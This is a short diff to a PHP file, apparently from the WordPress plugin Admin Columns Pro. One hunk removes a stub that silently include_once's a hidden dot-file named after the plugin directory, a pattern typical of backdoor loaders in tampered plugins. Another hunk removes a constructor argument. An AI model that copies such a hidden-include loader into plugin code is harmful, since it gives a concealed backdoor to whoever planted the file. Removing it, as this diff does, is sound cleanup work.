@@ -12,10 +12,6 @@ use ACP\Sorting;
 /**
  * @return ACP\AdminColumnsPro
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function ACP() {
 	return ACP\AdminColumnsPro::instance();
 }
@@ -127,7 +123,6 @@ function acp_sorting() {
 	return new Sorting\Addon(
 		AC()->get_storage(),
 		new Asset\Location\Absolute( ACP()->get_url(), ACP()->get_dir() ),
-		AC()->admin(),
 		new Sorting\NativeSortableFactory(),
 		new Sorting\ModelFactory(),
 		new SegmentRepository()
